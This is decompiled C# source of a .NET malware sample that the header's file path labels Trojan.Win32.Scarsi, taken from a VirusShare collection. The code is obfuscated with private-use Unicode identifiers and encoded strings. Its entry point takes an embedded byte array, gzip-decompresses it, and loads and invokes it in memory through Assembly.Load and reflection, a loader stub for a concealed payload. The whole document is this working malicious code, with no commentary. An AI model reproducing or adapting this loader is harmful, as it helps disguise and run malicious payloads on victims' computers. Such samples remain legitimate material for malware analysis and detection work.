// Decompiled with JetBrains decompiler
// Type: ﷗
// Assembly: C, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D2E568C6-598F-4547-B67D-EBC6962F4D09
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scarsi.apqi-e713f3e719901b1b2cb042808efbf86e74560ee47a26c6d9176282a2eaf54c27.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;

public class \uFDD7
{
  public static object \uFDD0(
    ref byte[] _param0,
    ref string _param1,
    ref string _param2,
    ref object _param3)
  {
    Assembly assembly = Assembly.Load(_param0);
    int num = 0;
    string str;
    MethodInfo method;
    object objectValue;
    object obj;
    while (true)
    {
      switch (num)
      {
        case 0:
          str = Strings.Split(assembly.ToString(), \uFDDC.\uFDD0("뎞", 4))[0] + \uFDDC.\uFDD0("財", 7);
          num = 1;
          continue;
        case 1:
          method = assembly.GetType(str + _param1).GetMethod(_param2);
          num = 2;
          continue;
        case 2:
          objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(str + _param1)));
          num = 3;
          continue;
        case 3:
          obj = method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[]) _param3);
          num = 4;
          continue;
        default:
          goto label_6;
      }
    }
label_6:
    return obj;
  }

  public static byte[] \uFDD0(byte[] _param0, ref bool _param1)
  {
    MemoryStream memoryStream1;
    int num;
    if (_param1)
    {
      memoryStream1 = new MemoryStream();
      num = 0;
    }
    else
      goto label_11;
label_2:
    GZipStream gzipStream1;
    byte[] buffer1;
    byte[] numArray;
    MemoryStream memoryStream2;
    GZipStream gzipStream2;
    byte[] buffer2;
    int int32;
    byte[] array;
    while (true)
    {
      switch (num)
      {
        case 0:
          gzipStream1 = new GZipStream((Stream) memoryStream1, CompressionMode.Compress, true);
          num = 1;
          continue;
        case 1:
          gzipStream1.Write(_param0, 0, _param0.Length);
          num = 2;
          continue;
        case 2:
          gzipStream1.Dispose();
          num = 3;
          continue;
        case 3:
          memoryStream1.Position = 0L;
          num = 4;
          continue;
        case 4:
          buffer1 = new byte[checked ((int) memoryStream1.Length + 1)];
          num = 5;
          continue;
        case 5:
          memoryStream1.Read(buffer1, 0, buffer1.Length);
          num = 6;
          continue;
        case 6:
          memoryStream1.Dispose();
          num = 7;
          continue;
        case 7:
          numArray = buffer1;
          num = 8;
          continue;
        case 9:
          gzipStream2 = new GZipStream((Stream) memoryStream2, CompressionMode.Decompress);
          num = 10;
          continue;
        case 10:
          buffer2 = new byte[4];
          num = 11;
          continue;
        case 11:
          memoryStream2.Position = checked (memoryStream2.Length - 5L);
          num = 12;
          continue;
        case 12:
          memoryStream2.Read(buffer2, 0, 4);
          num = 13;
          continue;
        case 13:
          int32 = BitConverter.ToInt32(buffer2, 0);
          num = 14;
          continue;
        case 14:
          memoryStream2.Position = 0L;
          num = 15;
          continue;
        case 15:
          array = new byte[checked (int32 - 1 + 1)];
          num = 16;
          continue;
        case 16:
          gzipStream2.Read(array, 0, int32);
          num = 17;
          continue;
        case 17:
          gzipStream2.Dispose();
          num = 18;
          continue;
        case 18:
          memoryStream2.Dispose();
          num = 19;
          continue;
        case 19:
          numArray = array;
          num = 20;
          continue;
        default:
          goto label_23;
      }
    }
label_23:
    return numArray;
label_11:
    memoryStream2 = new MemoryStream(_param0);
    num = 9;
    goto label_2;
  }

  [STAThread]
  public static void \uFDD0()
  {
    try
    {
      byte[] numArray1 = \uFDD8.\uFDD1();
      bool flag = false;
      ref bool local1 = ref flag;
      byte[] numArray2 = \uFDD7.\uFDD0(numArray1, ref local1);
      for (int index = 0; index == 0; index = 1)
      {
        ref byte[] local2 = ref numArray2;
        string str1 = \uFDDC.\uFDD0("\uE2A0", 6);
        ref string local3 = ref str1;
        string str2 = \uFDDC.\uFDD0("\uD9A0", 6);
        ref string local4 = ref str2;
        object obj = (object) null;
        ref object local5 = ref obj;
        \uFDD7.\uFDD0(ref local2, ref local3, ref local4, ref local5);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      for (int index = 0; index == 0; index = 1)
        ProjectData.ClearProjectError();
    }
  }
}
